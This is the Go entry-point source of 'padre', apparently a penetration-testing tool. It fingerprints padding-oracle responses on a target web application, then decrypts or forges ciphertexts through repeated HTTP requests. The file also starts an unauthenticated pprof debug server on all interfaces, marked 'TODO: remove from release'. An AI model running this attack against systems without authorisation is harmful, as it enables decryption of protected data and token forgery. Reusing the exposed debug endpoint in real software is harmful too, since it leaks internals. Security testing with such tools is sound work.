package main

import (
	"bufio"
	"fmt"
	"log"
	"net/http"
	"os"

	fcolor "github.com/fatih/color"
	"github.com/glebarez/padre/pkg/client"
	"github.com/glebarez/padre/pkg/color"
	"github.com/glebarez/padre/pkg/encoder"
	"github.com/glebarez/padre/pkg/exploit"
	out "github.com/glebarez/padre/pkg/output"
	"github.com/glebarez/padre/pkg/probe"
	"github.com/glebarez/padre/pkg/util"

	_ "net/http/pprof"

	_ "net/http"
)

var (
	stderr = fcolor.Error
	stdout = os.Stdout
)

func main() {
	// TODO: remove from release
	go func() {
		log.Println(http.ListenAndServe("0.0.0.0:6060", nil))
	}()

	var err error

	// initialize printer
	print := &out.Printer{
		Stream: stderr,
	}

	// determine terminal width
	termWidth, err := util.TerminalWidth()
	if err != nil {
		// fallback to default
		print.TerminalWidth = defaultTerminalWidth
		print.Errorf("Could not determine terminal width. Falling back to %d", defaultTerminalWidth)
	} else {
		print.TerminalWidth = termWidth
	}

	// parse CLI arguments
	args, errs := parseArgs()

	// check if errors occurred during CLI arguments parsing
	if len(errs.errors) > 0 {
		for _, e := range errs.errors {
			print.Error(e)
		}

		print.Printlnf("Run with %s option to see usage help", color.CyanBold("-h"))
		os.Exit(1)
	}

	// check if warnings occurred during CLI arguments parsing
	for _, w := range errs.warnings {
		print.Warning(w)
	}

	// show welcoming message
	print.Info("%s is on duty", color.CyanBold("padre"))

	// be verbose about concurrency
	print.Info("using concurrency (http connections): %s", color.Green(*args.Parallel))

	// initialize HTTP client
	client := &client.Client{
		HTTPclient: &http.Client{
			Transport: &http.Transport{
				MaxConnsPerHost: *args.Parallel,
				Proxy:           http.ProxyURL(args.ProxyURL),
			}},
		URL:               *args.TargetURL,
		POSTdata:          *args.POSTdata,
		Cookies:           args.Cookies,
		CihperPlaceholder: `$`,
		Encoder:           args.Encoder,
		Concurrency:       *args.Parallel,
		ContentType:       *args.ContentType,
	}

	// create matcher for padding error
	var matcher probe.PaddingErrorMatcher

	if *args.PaddingErrorPattern != "" {
		matcher, err = probe.NewMatcherByRegexp(*args.PaddingErrorPattern)
		if err != nil {
			print.Error(err)
			os.Exit(1)
		}
	}

	// -- detect/confirm padding oracle
	// set block lengths to try
	var blockLengths []int

	if *args.BlockLen == 0 {
		// no block length expliitly provided, we need to try all supported lengths
		blockLengths = []int{8, 16, 32}
	} else {
		blockLengths = []int{*args.BlockLen}
	}

	var i, bl int
	// if matcher was already created due to explicit pattern provided in args
	// we need to just confirm the existence of padding oracle
	if matcher != nil {
		print.Action("confirming padding oracle...")
		for i, bl = range blockLengths {
			confirmed, err := probe.ConfirmPaddingOracle(client, matcher, bl)
			if err != nil {
				print.Error(err)
				os.Exit(1)
			}

			// exit as soon as padding oracle is confirmed
			if confirmed {
				print.Success("padding oracle confirmed")
				break
			}

			// on last iteration, getting here means confirming failed
			if i == len(blockLengths)-1 {
				print.Errorf("padding oracle was not confirmed")
				os.Exit(1)
			}
		}
	}

	// if matcher was not created (e.g. pattern was not provided in CLI args)
	// then we need to auto-detect the fingerprint of padding oracle
	if matcher == nil {
		print.Action("fingerprinting HTTP responses for padding oracle...")
		for i, bl = range blockLengths {
			matcher, err = probe.DetectPaddingErrorFingerprint(client, bl)
			if err != nil {
				print.Error(err)
				os.Exit(1)
			}

			// exit as soon as fingerprint is detected
			if matcher != nil {
				print.Success("successfully detected padding oracle")
				break
			}

			// on last iteration, getting here means confirming failed
			if i == len(blockLengths)-1 {
				print.Errorf("could not auto-detect padding oracle fingerprint")
				os.Exit(1)
			}
		}
	}

	// set block length if it was auto-detected
	if *args.BlockLen == 0 {
		*args.BlockLen = bl
		print.Success("detected block length: %s", color.Green(bl))
	}

	// print mode used
	if *args.EncryptMode {
		print.Warning("mode: %s", color.CyanBold("encrypt"))
	} else {
		print.Warning("mode: %s", color.CyanBold("decrypt"))
	}

	// build list of inputs to process
	inputs := make([]string, 0)

	if args.Input == nil {
		// read inputs from stdin
		scanner := bufio.NewScanner(os.Stdin)
		for scanner.Scan() {
			inputs = append(inputs, scanner.Text())
		}
	} else {
		// use single input, passed in CLI arguments
		inputs = append(inputs, *args.Input)
	}

	// init padre instance
	padre := &exploit.Padre{
		Client:   client,
		Matcher:  matcher,
		BlockLen: *args.BlockLen,
	}

	// process inputs one by one
	var errCount int

	for i, input := range inputs {
		// create new status bar for current input
		prefix := color.CyanBold(fmt.Sprintf("[%d/%d]", i+1, len(inputs)))
		print.AddPrefix(prefix)

		var (
			output []byte
			bar    *out.HackyBar
		)

		// encrypt or decrypt
		if *args.EncryptMode {
			// init hacky bar
			bar = out.CreateHackyBar(args.Encoder, len(exploit.Pkcs7Pad(input, bl))+bl, *args.EncryptMode, print)

			// provide HTTP client with event-channel, so we can count RPS
			client.RequestEventChan = bar.ChanReq

			bar.Start()
			output, err = padre.Encrypt(input, bar.ChanOutput)
			bar.Stop()
		} else {
			if input == "" {
				err = fmt.Errorf("empty input cipher")
				goto Error
			}

			// decode input into bytes
			var ciphertext []byte
			ciphertext, err = args.Encoder.DecodeString(input)
			if err != nil {
				goto Error
			}

			// init hacky bar
			bar = out.CreateHackyBar(encoder.NewASCIIencoder(), len(ciphertext)-bl, *args.EncryptMode, print)

			// provide HTTP client with event-channel, so we can count RPS
			client.RequestEventChan = bar.ChanReq

			// do decryption
			bar.Start()
			output, err = padre.Decrypt(ciphertext, bar.ChanOutput)
			bar.Stop()
			if err != nil {
				goto Error
			}
		}

		// warn about output overflow
		if bar.Overflow && util.IsTerminal(stdout) {
			print.Warning("Output was too wide to fit to you terminal. Redirect STDOUT somewhere to get full output")
		}

	Error:

		// in case of error, skip to the next input
		if err != nil {
			print.Error(err)
			errCount++
			continue
		}

		// write output only if output is redirected to file or piped
		// this is because outputs already will be in status output
		// so printing them to STDOUT again is not necessary
		if !util.IsTerminal(stdout) {
			/* in case of encryption, additionally encode the produced output */
			if *args.EncryptMode {
				outputStr := args.Encoder.EncodeToString(output)
				_, err = stdout.WriteString(outputStr + "\n")
				if err != nil {
					// do not tolerate errors in output writer
					print.Error(err)
					os.Exit(1)
				}
			} else {
				stdout.Write(append(output, '\n'))
			}
		}
	}

	/* non-zero return code if all inputs were errornous */
	if len(inputs) == errCount {
		os.Exit(2)
	}
}
